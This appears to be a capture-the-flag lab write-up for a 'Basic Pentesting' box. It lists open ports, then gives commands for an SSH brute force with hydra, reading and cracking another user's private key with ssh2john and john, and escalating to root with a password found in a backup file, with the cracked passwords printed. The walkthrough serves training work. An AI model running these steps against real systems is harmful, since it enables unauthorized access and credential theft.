# Basic Pentesting

**IP Address:** 10.10.163.42

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X |
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 |
| 445/tcp | open | netbios-ssn | Samba smbd 4.3.11-Ubuntu |
| 80/tcp | open | http | Apache httpd 2.4.18 |
| 8009/tcp | open | ajp13 | Apache Jserv  |
| 8080/tcp | open | http | Apache Tomcat 9.0.7 |
| 137/udp | open | netbios-ns | Samba nmbd netbios-ns  |

1. A text file (staff.txt found Anonymous share on the smb server gives us 2 user names (Jan & Kay). Also another website located http://10.10.163.42/development/j.txt even though it only uses initials indicates that possibly the user Jan has a weak password. Using a ssh brute force we can easily crack into jan's account. 

Commands
```bash
hydra $ip -s 22 ssh -l jan -P /usr/share/wordlists/rockyou.txt -V -F
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

2. We can now login via ssh and find that we have read access to kay's ssh key. 

Commands
```
ssh jan@$ip
armando
ls -al /home/kay/.ssh/
```

![Execute Exploit](images/exploit3.png)

3. After copying this ssh key to our attack box we can crack the password to the private key and use it to ssh into the host as kay. \

Commands
```
ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
ssh kay@$ip -i id_rsa
beeswax
```

![Execute Exploit](images/exploit4.png)

4. We then locate kay's password in the home directory which we can use to elevate straight to root with sudo. 

Commands
```
cat pass.bak
sudo su
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
whoami
cat /root/flag.txt
```

![Execute Exploit](images/exploit5.png)